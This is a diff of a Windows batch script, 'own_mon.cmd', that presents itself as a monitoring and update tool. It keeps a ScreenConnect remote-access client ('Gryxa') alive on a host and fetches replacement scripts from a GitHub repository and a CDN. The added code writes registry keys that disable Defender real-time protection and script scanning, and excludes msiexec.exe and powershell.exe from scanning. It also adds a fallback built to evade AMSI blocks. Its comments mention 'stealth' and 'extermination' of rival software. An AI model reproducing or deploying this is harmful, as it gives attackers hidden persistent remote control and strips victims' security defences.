@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M42
-rem  M41: relay-verified sync; INFLIGHT≠OK; sevrz MSI validate; force_gryxa fc; SY heal SDDL via S12.
-rem  M40: restore :RepairRegistered. M39: per-tick Defender RTP-off + SC exclusions.
+rem  OWN_MON  BUILD 20260804M43
+rem  M43: AMSI-proof Gryxa fallback via own_gryxa.cmd (pure msiexec) when PS blocked/missing.
+rem  M42: signed manifest; sevrz.cfg; sibling-safe sevrz /i.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
@@ -24,6 +24,8 @@ set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.
 set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
 set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
+set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
+set "OWNGRYXA2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
 set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
 set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
 set "SEVRZ_EXP_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
@@ -40,7 +42,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M42"
+set "MONVER=M43"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -101,6 +103,8 @@ if not exist "%STAGE%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time
 if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.new" "%OWNLIB2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON%" >nul 2>&1
 if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
+if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest" "%MANIFEST_URL%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest.sig" "%MANIFEST_SIG_URL%" >nul 2>&1
 
@@ -111,6 +115,7 @@ if exist "%STAGE%\own_lib.new" set "MAP=!MAP!own_lib.ps1=%STAGE%\own_lib.new;"
 if exist "%STAGE%\own_mon.next" set "MAP=!MAP!own_mon.cmd=%STAGE%\own_mon.next;"
 if exist "%STAGE%\own_secure.new" set "MAP=!MAP!own_secure.cmd=%STAGE%\own_secure.new;"
 if exist "%STAGE%\tg_report.new" set "MAP=!MAP!tg_report.ps1=%STAGE%\tg_report.new;"
+if exist "%STAGE%\own_gryxa.new" set "MAP=!MAP!own_gryxa.cmd=%STAGE%\own_gryxa.new;"
 set "VRES=missing"
 if exist "%WD%\own_lib.ps1" if exist "%STAGE%\update.manifest" if exist "%STAGE%\update.manifest.sig" if defined MAP (
   for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action verify-update -WorkDir "%WD%" -Extra "%STAGE%\update.manifest|%STAGE%\update.manifest.sig|!MAP!"`) do set "VRES=%%R"
@@ -132,6 +137,7 @@ if /I "!UPD_OK!"=="1" (
   if exist "%STAGE%\tg_report.new" move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
   if exist "%STAGE%\own_secure.new" move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
   if exist "%STAGE%\own_lib.new" move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+  if exist "%STAGE%\own_gryxa.new" findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
   set "SELF_UPD=0"
   if exist "%STAGE%\own_mon.next" (
     fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
@@ -142,6 +148,7 @@ if /I "!UPD_OK!"=="1" (
   findstr /C:"TG_REPORT BUILD" "%STAGE%\tg_report.new" >nul 2>&1 && for %%F in ("%STAGE%\tg_report.new") do if %%~zF GTR 1500 move /y "%STAGE%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
   findstr /C:"OWN_SECURE BUILD" "%STAGE%\own_secure.new" >nul 2>&1 && for %%F in ("%STAGE%\own_secure.new") do if %%~zF GTR 800 move /y "%STAGE%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
   findstr /C:"OWN_LIB  BUILD" "%STAGE%\own_lib.new" >nul 2>&1 && for %%F in ("%STAGE%\own_lib.new") do if %%~zF GTR 1500 move /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+  findstr /C:"OWN_GRYXA BUILD" "%STAGE%\own_gryxa.new" >nul 2>&1 && for %%F in ("%STAGE%\own_gryxa.new") do if %%~zF GTR 500 move /y "%STAGE%\own_gryxa.new" "%WD%\own_gryxa.cmd" >nul 2>&1
   set "SELF_UPD=0"
   findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
   if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
@@ -150,11 +157,18 @@ if /I "!UPD_OK!"=="1" (
   )
   if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
 ) else (
-  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" >nul 2>&1
+  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" >nul 2>&1
   set "SELF_UPD=0"
 )
-del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" >nul 2>&1
+del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" >nul 2>&1
 del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
+
+rem M43: if lib still missing (AMSI wiped it / never landed), keep a TEMP copy for fallbacks
+if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" copy /y "%STAGE%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+if not exist "%WD%\own_gryxa.cmd" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
+  if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
+)
 
 rem M42: sevrz.cfg dynamic FP from repo sevrz_expected.cfg
 if exist "%WD%\sevrz.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\sevrz.cfg") do (
@@ -388,10 +402,18 @@ if errorlevel 1 (
 rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
 rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
-rem M39: also re-assert RTP-off + SC Client* dir/process exclusions EVERY tick —
-rem 2-hourly own_secure left a window where Defender re-enabled RTP and stripped
-rem the Gryxa service outside of boot (host connects, Defender strips it, drops).
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}; try{Add-MpPreference -ExclusionPath '%WD%','%ETL%',(Join-Path $env:ProgramFiles 'ScreenConnect Client*'),(Join-Path ${env:ProgramFiles(x86)} 'ScreenConnect Client*') -ErrorAction Stop}catch{}; foreach($x in @('ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe')){try{Add-MpPreference -ExclusionProcess $x -ErrorAction SilentlyContinue}catch{}}" >nul 2>&1
+rem M39/M43: MpPreference when WinDefend alive; always also write policy/exclusion REG
+rem (Hell host: WinDefend dead → 0x800106ba, but AMSI still blocked PS — reg + own_gryxa.cmd cover it)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ETL%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramFiles%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%ProgramFiles(x86)%\ScreenConnect Client*" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue'; try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}; try{Set-MpPreference -DisableScriptScanning $true}catch{}; try{Add-MpPreference -ExclusionPath '%WD%','%ETL%',(Join-Path $env:ProgramFiles 'ScreenConnect Client*'),(Join-Path ${env:ProgramFiles(x86)} 'ScreenConnect Client*') -ErrorAction Stop}catch{}; foreach($x in @('ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe','powershell.exe')){try{Add-MpPreference -ExclusionProcess $x -ErrorAction SilentlyContinue}catch{}}" >nul 2>&1
 
 rem ── [G] periodic full re-secure every ~2 h ────────────────────
 powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
@@ -531,16 +553,57 @@ exit /b 0
 
 rem ═══════════════ helpers ═══════════════
 :EnsureGryxaMust
-rem O41: thin wrapper - never msiexec; gryxa-ensure + Running lock.
+rem M43: try PS lib first; if missing/AMSI-blocked/still down → pure-cmd own_gryxa.cmd
 set "GRYXA_OK=0"
-if exist "%WD%\own_lib.ps1" (
-  set "GRES="
-  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
-  echo gryxa_must_lib=!GRES!>>"%LOG%"
-  echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
-)
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+
+rem soft reg exclusions every must-heal (works even when WinDefend service dead)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
+
+rem re-fetch lib into TEMP if WD copy missing (AMSI/quarantine wipe)
+if not exist "%WD%\own_lib.ps1" (
+  echo gryxa_must_lib_missing_refetch>>"%LOG%"
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%SystemRoot%\Temp\.upd\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1" >nul 2>&1
+  if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" copy /y "%SystemRoot%\Temp\.upd\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
+)
+
+set "LIB=%WD%\own_lib.ps1"
+if not exist "%LIB%" if exist "%SystemRoot%\Temp\.upd\own_lib.ps1" set "LIB=%SystemRoot%\Temp\.upd\own_lib.ps1"
+
+if exist "%LIB%" (
+  set "GRES="
+  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%LIB%" -Action gryxa-ensure -NoWait -WorkDir "%WD%" -Build %MONVER% 2^>nul`) do set "GRES=%%R"
+  echo gryxa_must_lib=!GRES!>>"%LOG%"
+  echo !GRES!| findstr /I "malicious ScriptContainedMaliciousContent" >nul
+  if not errorlevel 1 (
+    echo gryxa_must_amsi_blocked>>"%LOG%"
+    set "GRES="
+  )
+  echo !GRES!| findstr /I /B /C:"HEALTHY" /C:"QUEUED" /C:"INFLIGHT" >nul
+  if not errorlevel 1 timeout /t 15 /nobreak >nul
+)
+
+sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 set "GRYXA_OK=1"
+
+if "%GRYXA_OK%"=="0" (
+  echo gryxa_must_cmd_fallback>>"%LOG%"
+  if not exist "%WD%\own_gryxa.cmd" (
+    "%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
+    if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 10 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
+  )
+  if exist "%WD%\own_gryxa.cmd" (
+    rem detached so mon tick is not blocked by msiexec
+    start "" /b cmd /c "call \"%WD%\own_gryxa.cmd\" \"%WD%\" \"%GRYXA_FP%\" \"%KEEP_FP%\" \"%ALT_FP%\" >>\"%LOG%\" 2>&1"
+    echo gryxa_must_cmd_spawned>>"%LOG%"
+    timeout /t 25 /nobreak >nul
+  ) else (
+    echo gryxa_must_cmd_missing>>"%LOG%"
+  )
+)
+
 sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
